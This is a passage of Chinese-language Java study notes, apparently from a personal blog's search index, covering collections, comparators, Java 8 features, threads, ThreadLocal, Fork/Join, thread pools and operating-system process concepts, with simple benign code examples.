可以为空\n\n\nSet\nHashSet\n是\n\n\n\n\nLinkedHashSet\n是\n\n\n\n\nTreeSet\n否\n\n\n\nList\nArrayList\n是\n\n\n\nList&amp;Queue\nLinkedList\n是\n\n\n\nQueue\nPriorityQueue\n否\n\n\n\n\nArrayQueue\n否\n\n\n\n\n\n\n\n\n\nComparable和ComparatorComparable 接口和 Comparator 接口都是 Java 中用于排序的接口。\n\n\n\n接口名\n抽象方法签名\n包名\n\n\n\nComparable\npublic int compareTo(T o);\njava.lang\n\n\nComparator\nint compare(T o1, T o2);\njava.util\n\n\nComparable和Comparator一个基本的区别特征是，使用 Comparable只能定义一种比较。而使用Comparator可以根据需要为给定类型定义多种比较逻辑。\nComparable\nComparable顾名思义，表示实现了Comparable接口的类型的对象是可比较的。\n类对Comparable接口的compareTo方法的实现，定义了同一个类的不同对象之间进行比较的策略。这被称为类的“自然排序”。\n如果类实现了 Comparable 接口，那么在使用 Collections.sort() 或 Arrays.sort() 方法时，会自动根据 CompareTo 方法定义的自然顺序，对该对象的 List 或 Array 进行排序。\nComparator\nComparator接口和要排序的对象类型之间没有实现（implements）关系。Comparator接口的compare方法的实现，定义了比较逻辑，如果返回正数，表示第一个对象大于第二个对象，如果返回负数，表示第一个对象小于第二个对象，如果返回0，说明第一个对象等于第二个对象。\n浅拷贝和深拷贝在Java语言里，当我们需要拷贝一个对象时，有两种类型的拷贝：浅拷贝与深拷贝。浅拷贝只是拷贝了源对象的地址，所以源对象的值发生变化时，拷贝对象的值也会发生变化。而深拷贝则是拷贝了源对象的所有值，所以即使源对象的值发生变化时，拷贝对象的值也不会改变。如下图描述：\n\nJava8新特性（部分）\n默认方法（Default Methods）：接口中可以定义默认方法，这些方法具有默认的实现，可以在接口中直接使用，而不需要实现类必须重写这些方法。这样的设计使得在接口的演进过程中可以向现有的接口添加新的方法，而不会破坏现有的实现。\nLambda 表达式：Lambda 表达式是一种简洁的语法形式，用于表示匿名函数。它可以用来简化代码，尤其是在使用函数式接口（只有一个抽象方法的接口）时。Lambda 表达式可以使代码更加紧凑和易读。\n函数式接口：Java 8 引入了 java.util.function 包，提供了一组函数式接口，用于支持函数式编程。例如，Predicate、Function、Consumer 等接口可以在 Lambda 表达式中使用，使得函数式编程更加便捷。\n方法引用：方法引用是一种更简洁的 Lambda 表达式的写法，它直接引用现有的方法作为 Lambda 表达式的实现。方法引用可以提高代码的可读性，并且可以重用现有的方法逻辑。\nStream API：Stream API 提供了一种流式操作集合数据的方式。它可以用于对集合进行过滤、映射、排序、归约等操作，提供了函数式、流畅的操作方式，可以编写简洁、高效的代码。\n新的日期&#x2F;时间 API：Java 8 引入了新的日期&#x2F;时间 API（java.time 包），提供了更加强大和易用的日期和时间处理功能。新的 API 解决了旧的 Date 和 Calendar 类的许多问题，并提供了更多的操作和格式化选项。\n\nGuavaGuava（Google Guava）是Google开发的一个开源Java库，提供了许多实用的工具类和函数，用于简化Java开发过程中的常见任务和操作。\nGuava提供了多个模块，包括集合（Collections）、缓存（Caches）、并发（Concurrency）、字符串处理（Strings）、IO操作（IO）、函数式编程（Functional Programming）、原生类型支持（Primitives）、事件总线（EventBus）等。\nReferences\n凯·S. 霍斯特曼. Java核心技术:原书第12版. 卷一, 开发基础. –北京: 机械工业出版社. 2022.5.\nhttps://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html\nhttps://javaguide.cn/java/collection/java-collection-questions-01.html\nhttps://javaguide.cn/java/concurrent/java-concurrent-questions-02.html \nhttps://gitee.com/SnailClimb/JavaGuide/blob/main/docs/java/basis/serialization.md\nhttps://gitee.com/SnailClimb/JavaGuide/blob/main/docs/java/io/nio-basis.md\n\n","categories":["IT"],"tags":["java基础"]},{"title":"Java并发编程","url":"/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/","content":"线程线程的创建方式Java 中创建线程的方法有四种：继承 Thread 类、实现 Runnable 接口、实现 Callable 接口并使用FutureTask类以及通过线程池创建线程。\n\n继承 Thread 类：\n\n继承 Thread 类是创建线程最简单的方式，在该类中重写 run() 方法即可实现线程的执行逻辑。可以通过 start() 方法启动线程，如下所示：\nclass MyThread extends Thread &#123;    @Override    public void run() &#123;        // 实现线程执行逻辑    &#125;&#125;MyThread thread = new MyThread();thread.start();\n\n\n实现 Runnable 接口：\n\n实现 Runnable 接口也是一种常见的创建线程的方式，可以将 Runnable 对象传递给 Thread 类，通过 start() 方法启动线程，如下所示：\nclass MyRunnable implements Runnable &#123;    @Override    public void run() &#123;        // 实现线程执行逻辑    &#125;&#125;MyRunnable runnable = new MyRunnable();Thread thread = new Thread(runnable);thread.start();\n\n\n实现 Callable 接口并使用FutureTask类：\n\n与 Runnable 接口相比，Callable 接口可以返回执行结果，并且可以抛出异常。\n但是Callable接口实例不能作为Thread类的target，所以还需要一个Thread和Callable之间的“搭桥接口”，这个搭桥接口是继承了Runnable接口的RunnableFuture接口，实际中使用的是RunnableFuture接口的实现类FutureTask类，FutureTask允许使用Callable对象作为参数，FutureTask对象可以作为Thread类的target。\n使用方法如下所示：\nclass MyCallable implements Callable&lt;String&gt; &#123;    @Override    public String call() throws Exception &#123;        System.out.println(&quot;calling&quot;);        return &quot;this is the result of the execute&quot;;    &#125;&#125;public static void main(String[] args) &#123;    MyCallable myCallable = new MyCallable();    FutureTask&lt;String&gt; futureTask = new FutureTask&lt;&gt;(myCallable);    Thread thread = new Thread(futureTask);    thread.start();    try &#123;        System.out.println(futureTask.get()); // 获取任务的执行结果    &#125; catch (InterruptedException | ExecutionException e) &#123;        throw new RuntimeException(e);    &#125;&#125;/*输出结果：    calling    this is the result of the execute*/\n\n\n通过线程池创建线程\n见线程池的创建方式\n\n\n线程调度模型目前主流操作系统中主要基于时间片进行线程调度，调度模型可以分为分时调度模型和抢占式调度模型：\n\n分时调度模型：会平均分配CPU时间片，每个线程占用的CPU时间片都是一样的，所有线程会轮流占有CPU时间片。\n抢占式调度模型：按照线程的优先级分配时间片，线程的优先级越高，分配到CPU时间片的概览越大。\n\n线程方法\nstart：启动线程。\nsleep：让当前线程休眠（暂停执行）一段时间，不会释放锁。\nwait：让当前线程暂停执行并释放锁资源。\nnotify：随机唤醒一个因wait调用而处于等待中的线程。\nnotifyAll：唤醒所有因wait调用而处于等待中的线程。\npark：阻塞当前线程，等待被其它线程唤醒，不会释放锁。\nunpark：唤醒指定的线程，使其从等待状态中返回。\njoin：如果线程a调用了线程b的join()方法，则线程a会等待线程b执行完毕后再继续执行。\ninterrupt：如果是作用于对被sleep、wait、join阻塞的线程，会清除线程的中断标记并抛出异常；如果是作用于一个正在运行的线程，会强制终止该线程。\nyield：不会释放锁，只是让出当前线程的CPU执行时间片，回到就绪状态，等待CPU的调度。\n\n线程结束的方式\n等待线程自然执行完毕\nrun()方法执行完毕\n\n\n强制结束线程\n调用Interrupt()方法：推荐使用，原因是interrupt方法并不直接停止线程，而是由线程决定如何响应中断，线程有机会执行释放资源、保持数据一致性等操作。\n调用stop()方法：不推荐使用，原因是使用stop方法存在一些潜在的问题，如不能释放资源、数据不一致等。\n\n\n\n线程上下文切换线程上下文切换，也叫做线程切换。在线程上下文切换时，操作系统会保存运行线程的上下文。\n线程切换的场景：\n\n主动让出 CPU，比如调用了 sleep(), wait() 等。\n时间片用完，因为操作系统要防止一个线程或者进程长时间占用 CPU 导致其他线程或者进程饿死。\n调用了阻塞类型的系统中断，比如请求 IO，线程被阻塞。\n\n减少线程切换的措施：\n\n使用无锁编程\n创建合适的线程数\n使用协程\n\n线程同步线程同步是一种用于协调多个线程并发执行的机制，以确保它们按照特定的顺序或规则访问共享资源，避免数据出现不符合预期的操作结果。\n用户线程和守护线程\n用户线程\n默认情况下主线程和创建的新线程、新线程池都为用户线程。\n以线程为例，想要查看线程是否为守护线程只需通过调用 isDaemon() 方法查询即可，如果查询的值为 false 则表示不为守护线程。\n\n守护线程\n守护线程（Daemon Thread）也被称之为后台线程或服务线程，当程序中的用户线程全部执行结束之后，守护线程也会跟随结束。\nJVM中的垃圾回收线程、JIT编译线程都是守护线程\n守护线程可以按来源分两种：\n\nJVM中带有的守护线程\n\n将默认的用户线程修改为守护线程\n\n如果是线程，则可以通过设置 setDaemon(true) 方法将用户线程直接修改为守护线程\n如果是线程池则需要通过 ThreadFactory 将线程池中的每个线程都为守护线程才行\n\n\n\n\n\nThread类Thread类用于创建和启动线程，Thread类对象就是线程对象，内部定义了线程名name、线程所在的线程组group、向JVM申请的堆栈大小stackSize等信息。\nThread类实现了Runnable接口，Runnable接口是一个函数时接口。\n\n线程的生命周期Thread类内部定义了一个枚举类State，State类中定义了线程的执行状态，也就是线程的生命周期：\npublic enum State &#123;    //初始化状态：线程被创建出来但没有被调用 start()    NEW,    //可运行状态，包括就绪状态和运行状态：线程被调用了 start()等待运行的状态    RUNNABLE,    //阻塞状态：需要等待锁释放    BLOCKED,    //等待状态：表示该线程需要等待其他线程做出一些特定动作（通知或中断）    WAITING,    //超时等待状态：可以在指定的时间后自行返回而不是像 WAITING 那样一直等待    TIMED_WAITING,    //终止状态：表示该线程已经运行完毕    TERMINATED;&#125;\n\nJava 线程状态变迁图：\n\n线程局部变量线程局部变量用实现数据隔离。 线程局部变量有两种，ThreadLocal和InheritableThreadLocal，其中ThreadLocal在主线程和子线程之间不具备可继承性，而InheritableThreadLocal具备可继承性（子线程调用InheritableThreadLocal对象的get方法可以获取到父线程set到该对象中的值。父线程是创建和启动子线程的线程）。\nThreadLocalThreadLocal对象存储在线程对象（Thread对象）的一个类型为ThreadLocal.ThreadLocalMap的对象threadlocals中，ThreadLocalMap是ThreadLocal类的内部类。\n具体来说，在ThreadLocalMap中，set到ThreadLocal对象的值作为值（value），ThreadLocal对象作为键（key），并且key是一个弱引用。因为ThreadLocal对象（key）是一个弱引用，所以当线程销毁后，由于ThreadLocal对象不再被强引用，所以ThreadLocal对象可以被垃圾回收。但是threadlocals中依然存在键值对，所以为了避免内存溢出，还是需要手动移除（remove）ThreadLocal对象。\nThreadLocal的使用方法示例：\n//创建一个用于存储String类型的ThreadLocal变量ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;();//设置当前线程的ThreadLocal变量值//threadLocal对象作为键值对中的键，set到threadLocal对象里的值作为键值对中的值，存储到线程对象中ThreadLocalMap类型的threadlocals变量中threadLocal.set(&quot;Hello, ThreadLocal!&quot;);//返回当前线程的ThreadLocal变量值String value = threadLocal.get();//清除当前线程的ThreadLocal变量值threadLocal.remove();\n\n每个线程可以创建多个ThreadLocal实例，每个ThreadLocal实例可以用来存储一个特定的值，例如，可以创建两个ThreadLocal实例来存储不同类型的值：\n//创建一个用于存储String类型的ThreadLocal变量ThreadLocal&lt;String&gt; threadLocal1 = new ThreadLocal&lt;&gt;();//创建一个用于存储Integer类型的ThreadLocal变量ThreadLocal&lt;Integer&gt; threadLocal2 = new ThreadLocal&lt;&gt;();\n\nInheritableThreadLocalInheritableThreadLocal的使用方法示例：\nstatic final InheritableThreadLocal&lt;String&gt; INHERITABLE_THREAD_LOCAL = new InheritableThreadLocal&lt;&gt;();public static void main(String[] args) &#123;    INHERITABLE_THREAD_LOCAL.set(&quot;主线程保存的值&quot;);    new Thread(() -&gt; &#123;    \tString value = INHERITABLE_THREAD_LOCAL.get();    \tSystem.out.println(&quot;子线程中访问主线程中保存的局部变量值：&quot; + value);    &#125;).start();&#125;/*输出结果：\t子线程中访问主线程中保存的局部变量值：主线程保存的值*/\n\n通过InheritableThreadLocal对象之所以能够访问到父（parent）线程的inheritableThreadLocals，是因为在创建线程的时候，会将parent线程的inheritableThreadLocals复制一份到子线程的inheritableThreadLocals中。\nFork&#x2F;Join框架Fork&#x2F;Join框架是从Java1.7开始提供的用于执行并行任务的框架，可以将一个比较大的任务拆分成多逻辑相同的小任务，最后汇总每个小任务的执行结果得到最终的结果，思想和Hadoop的MapReduce类似。\nFork&#x2F;Join框架使用了工作窃取算法，即处理完自己所在的任务队列的线程会去执行（窃取）其它线程的任务队列。\nJava提供的Fork&#x2F;Join框架涉及的核心类包括：\n\nForkJoinPool类：实现了Fork&#x2F;Join框架的线程池\nForkJoinWorkerThread类：是Fork&#x2F;Join框架的线程池中运行的线程\nForkJoinTask类：是Fork&#x2F;Join框架的任务，任务的处理逻辑在compute()方法中进行定义，提供了fork()和join()方法，分别实现了任务的拆分和合并。实际开发中，一般用它的两个子类RecursiveTask、RecursiveAction。\nRecursiveTask类：是ForkJoinTask的子类，实现了Callable接口，并提供返回结果。\nRecursiveAction类：是ForkJoinTask的子类，实现了Runnable接口，无返回结果。\nCountedCompleter类：任务完成后会触发执行的一个自定义的任务。\n\nJava1.8中引入的并行流就是基于Fork&#x2F;Join框架实现的。\n使用示例（使用Fork&#x2F;Join框架计算1~10000的累加和）：\npublic class ForkJoinTaskComputer extends RecursiveTask&lt;Integer&gt; &#123;    //任务拆分的最小粒度    private static final int MIN_COUNT = 2;    //开始数字    private int start;    //结束数字    private int end;    public ForkJoinTaskComputer(int start, int end) &#123;        this.start = start;        this.end = end;    &#125;    @Override    protected Integer compute() &#123;        int sum = 0;        int count = end - start;        if (count &lt;= MIN_COUNT) &#123;            for (int i = start; i &lt;= end; i++) &#123;                sum += i;            &#125;        &#125; else &#123;            //找到中间值            int middle = start + ((end - start) &gt;&gt; 1);            //生成子任务            ForkJoinTaskComputer leftTaskComputer = new ForkJoinTaskComputer(start, middle);            ForkJoinTaskComputer rightTaskComputer = new ForkJoinTaskComputer(middle + 1, end);            //执行子任务            leftTaskComputer.fork();            rightTaskComputer.fork();            //合并子任务            Integer leftResult = leftTaskComputer.join();            Integer rightResult = rightTaskComputer.join();            //计算总和            sum = leftResult + rightResult;        &#125;        return sum;    &#125;&#125;\n\npublic class ForkJoinTest &#123;    private static final int MIN_COUNT = 1;    private static final int MAX_COUNT = 10_000;    public static void main(String[] args) throws ExecutionException, InterruptedException &#123;        ForkJoinTaskComputer taskComputer = new ForkJoinTaskComputer(MIN_COUNT, MAX_COUNT);        ForkJoinPool forkJoinPool = new ForkJoinPool();        //将计算任务提交到线程池进行执行        ForkJoinTask&lt;Integer&gt; result = forkJoinPool.submit(taskComputer);        System.out.println(&quot;计算结果是&quot; + result.get());    &#125;&#125;/**输出结果：计算结果是50005000*/\n\n在这个例子中，使用Fork&#x2F;Join框架实现了计算1~10000的累加和，通过将大任务拆分成小任务，再将拆分后的小任务提交到线程池进行执行，最后将结果合并得到最终的计算结果。输出的计算结果是50005000，正确。\n线程池线程池的状态线程池在运行过程中涉及的状态包括：\n\nRUNNING：表示线程池处在运行状态，能处理正在执行的任务，能处理阻塞队列中的任务，能够接收新提交的任务。\nSHUTDOWN：表示线程池处在关闭状态，能处理正在执行的任务，能处理阻塞队列中的任务，但是不能接收新提交的任务。如果线程池处于RUNNING状态，此时调用shutdown()方法会使线程进入SHUTDOWN状态。\nSTOP：表示线程池处于停止状态，线程会中断正在执行的任务，不能处理阻塞队列中的任务，也不能接收新提交的任务。如果线程池处于RUNNING或者SHUTDOWN状态，那么调用线程池的shutdownNow()方法会使线程池进入STOP状态。\nTIDYING：如果线程池中已经没有正在执行的任务，并且线程池的阻塞队列为空，线程池就会进入TIDYING状态。当线程池处于SHUTDOWN或者STOP状态时，如果满足TIDYING状态的条件，线程池就会进入TIDYING状态。\nTERMINATED：如果线程池处于TIDYING状态，此时调用线程池的terminated方法，线程池就会进入TERMINATED状态。\n\n线程池的创建方式Java中线程池的创建有四个类可以实现，分别是Executors、ThreadPoolExecutor、ForkJoinPool、ScheduledThreadPoolExecutor。\n\n使用Executors类创建线程池\nExecutors 提供了一些静态工厂方法来创建不同类型的线程池，包括newFixedThreadPool、newWorkStealingPool、newCachedThreadPool、newScheduledThreadPool、newSingleThreadExecutor、newSingleThreadScheduledExecutor等。这种方式适用于简单的场景，但缺少可定制性，无法精细调整线程池的参数。其中newWorkStealingPool是JDK1.8新增的方法，表示创建一个具有并行级别的线程池，比Executors类中断其它方法创建的线程池有更高的并发性能。\n在Executors类中，newFixedThreadPool、newCachedThreadPool和newSingleThreadExecutor都是调用ThreadPoolExecutor类的构造方法实现的。所以《阿里巴巴Java开发手册》推荐直接调用ThreadPoolExecutor类的构造方法创建线程。\nnewWorkStealingPool是调用ForkJoinPool类的构造方法实现的。\nnewScheduledThreadPool和newSingleThreadScheduledExecutor是调用ScheduledThreadPoolExecutor类的构造方法实现的。\nExecutors类的使用示例：\n// 创建一个固定大小的线程池ExecutorService executor = Executors.newFixedThreadPool(10);\n\n使用ThreadPoolExecutor类创建线程池\n使用 ThreadPoolExecutor 构造函数手动创建线程池，可以自定义线程池的参数，参数如下：\npublic ThreadPoolExecutor(int corePoolSize, //线程池的核心线程数                              int maximumPoolSize, //最大线程数                              long keepAliveTime, //空闲线程存活时间                              TimeUnit unit, //空闲线程存活时间单位                              BlockingQueue&lt;Runnable&gt; workQueue, //阻塞队列                              ThreadFactory threadFactory, // 用来创建线程的线程工厂                              RejectedExecutionHandler handler) //拒绝处理任务时的策略\n\n\n当线程池中的线程数小于corePoolSize，即使存在空闲线程，也会创建新的线程。\n当线程池中的线程数大于corePoolSize，小于maximunPoolSize，那么只有当workQueue队列已满时才会创建新线程来执行任务。\n如果线程池中运行的线程数等于maximunPoolSize，并且workQueue队列已满，就会触发拒绝处理任务时的策略（handler）来拒绝任务的执行。\n\nThreadPoolExecutor类的使用示例：\n// 手动创建 ThreadPoolExecutor 对象// 除ArrayBlockingQueue外还有LinkedBlockingQueueBlockingQueue&lt;Runnable&gt; workQueue = new ArrayBlockingQueue&lt;&gt;(100); ThreadPoolExecutor executor = new ThreadPoolExecutor(10, 20, 60L, TimeUnit.SECONDS, workQueue);new ThreadPoolExecutor(nThreads, nThreads,                                      0L, TimeUnit.MILLISECONDS,                                      new LinkedBlockingQueue&lt;Runnable&gt;());\n\n使用ForkJoinPool类创建线程池\n从JDK1.8开始，Java增加了ForkJoinPool类用于创建work-stealing（工作窃取：池中的所有线程都试图找到并执行提交到池中和&#x2F;或由其他活动任务创建的任务，如果不存在，则最终阻止等待工作）线程池。\n使用 ForkJoinPool构造函数创建线程池，可以自定义的线程池参数如下\nprivate ForkJoinPool(int parallelism, //线程池的并发级别                         ForkJoinWorkerThreadFactory factory, //用来创建线程的线程工厂                         UncaughtExceptionHandler handler, // 执行任务时遇到不可恢复的错误而终止的内部工作线程的处理程序                         int mode, //处理任务队列的模式，取值可为FIFO_QUEUE或LIFO_QUEUE                         String workerNamePrefix) //表示线程池中执行任务的线程的名称前缀\n\n使用ScheduledThreadPoolExecutor类创建线程池\nScheduledThreadPoolExecutor类用于创建定时任务线程池。ScheduledThreadPoolExecutor继承了ThreadPoolExecutor类，本质上ScheduledThreadPoolExecutor类的构造方法还是调用了ThreadPoolExecutor类的构造方法，只不过在调用时，传递的阻塞队列的类型是DelayedWorkQueue。\n\n\n线程池执行任务的流程以ThreadPoolExecutor为例，线程池的任务执行流程是：\n\n对于提交到线程池的任务，首先会判断线程池中的线程数是否达到corePoolSize\n如果没有达到，就创建新的线程执行任务\n如果达到了，就判断workQueue是否已满\n如果没满，就添加到workQueue\n如果满了，就判断线程池中的线程数是否达到maximunPoolSize\n如果没有达到，就创建新线程来执行任务\n如果达到了，就执行拒绝执行策略\n\n\n\n\n\n\n\n线程池的拒绝策略以ThreadPoolExecutor为例，如果线程池中的线程数达到了maximunPoolSize，并且workQueue已满，没有空闲的线程，此时如果有任务提交到线程池，就会执行线程池的拒绝策略处理函数handler.rejectedExecution(command, this)。ThreadPoolExecutor中的handler的类型是RejectedExecutionHandler。\nprivate volatile RejectedExecutionHandler handler;\n\nRejectedExecutionHandler接口有四个实现类，这四个类就是JDK提供的线程池拒绝策略的实现类，如果没有传递该handler参数指定使用的拒绝策略，则默认执行AbortPolicy类的拒绝策略，否则执行传递的类的执行策略。继承RejectedExecutionHandler可以实现自定义的拒绝策略。\n\n\n\n线程池的拒绝策略\n处理方式\n\n\n\nAbortPolicy\n这是默认的拒绝策略。当线程池无法处理新的任务时，直接抛出RejectedExecutionException异常，阻止任务的提交。\n\n\nCallerRunsPolicy\n当线程池无法接受新的任务时，该策略会将被拒绝的任务交给提交任务的线程来执行，也就是让提交任务的线程自己执行被拒绝的任务。\n\n\nDiscardOldestPolicy\n在任务被拒绝后，尝试与线程池中最早的任务竞争执行线程。如果竞争成功，新提交的任务将会替换掉最早的任务。这样可以保留较新的任务，但仍有可能丢失一些旧的任务。\n\n\nDiscardPolicy\n在任务被拒绝后，直接丢弃被拒绝的任务，不做任何处理。这样会导致部分任务被丢弃，可能造成数据丢失。\n\n\n线程池的关闭方式Java 线程池的关闭方式有两种：调用 shutdown() 和 shutdownNow() 方法。\n\n调用 shutdown() 方法\nshutdown() 方法会平缓地关闭线程池，即不会中断正在执行的任务，能够处理完阻塞队列中已提交的任务，但不会接收新的任务。\nExecutorService executor = Executors.newFixedThreadPool(10);// 提交任务给线程池执行...// 关闭线程池executor.shutdown();\n\n调用 shutdownNow() 方法\nshutdownNow() 方法会强制立即关闭线程池，即中断所有正在执行的任务，不会处理阻塞队列中已提交的任务，更不会接收新的任务。\nExecutorService executor = Executors.newFixedThreadPool(10);// 提交任务给线程池执行...// 关闭线程池executor.shutdownNow();\n\n最佳线程数要确定线程池的最佳线程数是根据应用场景确定的，一般可以将程序分为CPU密集型程序和I&#x2F;O密集型程序，对于这两种程序，计算最佳线程数的方法是不同的。\n\nCPU密集型程序\nCPU密集型程序对CPU的资源利用率高，理论最佳线程数&#x3D;CPU核心数，一般会将线程数设为CPU核心数+1，以避免有的线程阻塞浪费CPU资源\n\nI&#x2F;O密集型程序\nI&#x2F;O密集型程序对CPU的资源利用率低，线程数的计算需要考虑I&#x2F;O操作的CPU占用率，理论上最佳线程数&#x3D;CPU核心数 * (1 + I&#x2F;O操作的耗时&#x2F;CPU计算的耗时)\n\n\n通过上述方式计算出的线程数只是理论上的最佳线程数，在实际中，需要对系统进行压测，并根据压测结果确定最佳线程数。\nXXX程进程和线程\n进程：操作系统分配资源的基本单位\n\n线程：操作系统执行的基本单位，可以通俗的理解为程序不同的执行路径\n\n\n进程生命周期\n**创建状态(new)**：进程正在被创建，尚未到就绪状态。\n**就绪状态(ready)**：进程已处于准备运行状态，即进程获得了除了处理器之外的一切所需资源，一旦得到处理器资源(处理器分配的时间片)即可运行。\n**运行状态(running)**：进程正在处理器上运行(单核 CPU 下任意时刻只有一个进程处于运行状态)。\n**阻塞状态(waiting)**：又称为等待状态，进程正在等待某一事件而暂停运行如等待某资源为可用或等待 IO 操作完成。即使处理器空闲，该进程也不能运行。\n**结束状态(terminated)**：进程正在从系统中消失。可能是进程正常结束或其他原因中断退出运行。\n\n进程间的通信方式\n**管道&#x2F;匿名管道(Pipes)**：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。\n有名管道(Named Pipes) : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循 先进先出(First In First Out) 。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。\n**信号(Signal)**：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；\n消息队列(Message Queuing)：消息队列是消息的链表,具有特定的格式,存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启(即，操作系统重启)或者显式地删除一个消息队列时，该消息队列才会被真正的删除。消息队列可以实现消息的随机查询,消息不一定要以先进先出的次序读取,也可以按消息的类型读取.比 FIFO 更有优势。消息队列克服了信号承载信息量少，管道只能承载无格式字 节流以及缓冲区大小受限等缺点。\n**信号量(Semaphores)**：信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。这种通信方式主要用于解决与同步相关的问题并避免竞争条件。\n**共享内存(Shared memory)**：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。可以说这是最有用的进程间通信方式。\n套接字(Sockets) : 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP&#x2F;IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。\n\n进程的调度算法\n先到先服务调度算法(FCFS，First Come, First Served) : 从就绪队列中选择一个最先进入该队列的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。\n短作业优先的调度算法(SJF，Shortest Job First) : 从就绪队列中选出一个估计运行时间最短的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。\n时间片轮转调度算法（RR，Round-Robin） : 时间片轮转调度是一种最古老，最简单，最公平且使用最广的算法。每个进程被分配一个时间段，称作它的时间片，即该进程允许运行的时间。\n多级反馈队列调度算法（MFQ，Multi-level Feedback Queue）：前面介绍的几种进程调度的算法都有一定的局限性。如短进程优先的调度算法，仅照顾了短进程而忽略了长进程 。多级反馈队列调度算法既能使高优先级的作业得到响应又能使短作业（进程）迅速完成。，因而它是目前被公认的一种较好的进程调度算法，UNIX 操作系统采取的便是这种调度算法。\n优先级调度算法（Priority）：为每个流程分配优先级，首先执行具有最高优先级的进程，依此类推。具有相同优先级的进程以 FCFS 方式执行。可以根据内存要求，时间要求或任何其他资源要求来确定优先级。\n\n协程（纤程）协程（Coroutine）是Linux中的概念，对应的纤程（Fiber）是Windows中的概念，实现思路大致相同。\n协程，是一种用户态的轻量级线程，协程的调度完全由用户控制（也就是在用户态执行）。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到线程的堆区，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，所以上下文的切换非常快。\n超线程超线程（Hyper-Threading）是Intel公司引入的一种处理器（CPU）技术。这项技术的主要目标是提高处理器核心的效率和性能。超线程通过使单个处理器核心模拟出两个“逻辑”核心，以便同时处理两个线程，从而提高了处理器的并行处理能力。\n传统的单核心处理器在任何时刻只能处理一个线程。但是，由于各种原因（例如，等待数据从内存中加载），处理器可能无法始终保持忙碌状态。在这些情况下，处理器的一部分（例如，算术逻辑单元或浮点单元）可能会闲置，从而造成资源浪费。\n超线程技术试图解决这个问题，通过在单个核心上同时运行两个线程，使得当一个线程在等待时，另一个线程可以使用处理器的资源进行计算。因此，超线程可以使处理器在相同的时间内完成更多的工作，从而提高处理器的整体效率和性能。\n然而，超线程并不总是能提供显著的性能提升。在某些情况下，如果两个线程需要使用相同的处理器资源，那么它们可能会相互竞争，从而导致性能下降。此外，超线程对于多线程程序或多任务环境最有效，对于单线程程序或单任务环境的效果可能不明显。\n请注意，虽然超线程可以提高处理器的并行处理能力，但它并不能取代多核处理器。多核处理器具有多个独立的物理核心，每个核心都可以处理自己的线程，因此它们通常可以提供比超线程更好的并行性和性能。\n并发编程相关的概念临界区\n临界区表示可以被多线程共享的资源，但是每次只能提供给一个线程使用\n在并发编程中，临界区指的是受保护的对象或程序代码段\n\n操作系统的互斥量操作系统的互斥量（Mutex）是一种同步原语（同步原语（Synchronization primitive）是计算机科学中用于实现线程同步的基本机制或工具），用于确保在任何给定时刻只有一个线程可以访问共享资源。\n用户态、内核态用户态（User Mode）和内核态（Kernel Mode）是计算机操作系统中的两种不同的执行模式，用于区分运行在不同特权级别下的软件代码。这两种模式的主要区别在于其所具有的权限和可执行的操作。\n\n用户态(User Mode) : 用户态运行的进程可以直接读取用户程序的数据，拥有较低的权限。当应用程序需要执行某些需要特殊权限的操作，例如读写磁盘、网络通信等，就需要向操作系统发起系统调用请求，进入内核态。\n**内核态(Kernel Mode)**：内核态运行的进程几乎可以访问计算机的任何资源包括系统的内存空间、设备、驱动程序等，不受限制，拥有非常高的权限。当操作系统接收到进程的系统调用请求时，就会从用户态切换到内核态，执行相应的系统调用，并将结果返回给进程，最后再从内核态切换回用户态。\n\n同时具有用户态和内核态主要是为了保证计算机系统的安全性、稳定性和性能。\n用户态切换到内核态的 3 种方式：\n\n系统调用（Trap）：用户态进程 主动 要求切换到内核态的一种方式，主要是为了使用内核态才能做的事情比如读取磁盘资源。系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现。\n中断（Interrupt）：当外围设备完成用户请求的操作后，会向 CPU 发出相应的中断信号，这时 CPU 会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。\n异常（Exception）：当 CPU 